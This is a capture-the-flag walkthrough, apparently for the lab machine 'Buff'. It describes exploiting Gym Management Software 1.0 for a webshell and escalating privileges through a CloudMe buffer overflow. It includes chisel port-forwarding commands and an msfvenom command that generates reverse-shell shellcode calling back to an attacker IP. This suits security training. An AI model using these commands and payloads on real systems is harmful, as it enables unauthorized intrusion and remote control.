# Buff

## Gaining Access

Nmap Scan:

<figure><img src="../../../.gitbook/assets/image (16) (4).png" alt=""><figcaption></figcaption></figure>

### Gym

On port 8080, it was a gym-related page:

<figure><img src="../../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>

We can use `gobuster` on the website to find more directories:

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Checking the `contact.php` file, we see the software used to make this.

<figure><img src="../../../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>

Then, we can search for exploits for this Gym Management Software 1.0.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can try the RCE exploit:

{% embed url="https://www.exploit-db.com/exploits/48506" %}

By running the exploit, we would gain a webshell:

<figure><img src="../../../.gitbook/assets/image (164) (3).png" alt=""><figcaption></figcaption></figure>

Afterwards, gaining a reverse shell via nc.exe or Powershell is trivial.

## Privilege Escalation

### CloudMe

When enumerating the user's directory, we find a CloudMe\_1112.exe file:

<figure><img src="../../../.gitbook/assets/image (4) (4).png" alt=""><figcaption></figcaption></figure>

When checking for exploits regarding CloudMe, we can find a few Buffer Overflow exploits that can be used for RCE using shellcode.

<figure><img src="../../../.gitbook/assets/image (15) (4).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.exploit-db.com/exploits/48389" %}

CloudMe for this machine runs on port 8888 on this machine, so we can just run it and use chisel to port forward port 8888.

```bash
# on Kali
chisel server --port 4444 --reverse

# on host
.\chisel.exe 10.10.16.9:4444 R:8888:localhost:8888
```

Then, we need to generate new shellcode for the exploit:

{% code overflow="wrap" %}
```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
```
{% endcode %}

Afterwards, we can simply run the exploit and it would spawn a root shell on the listener port.
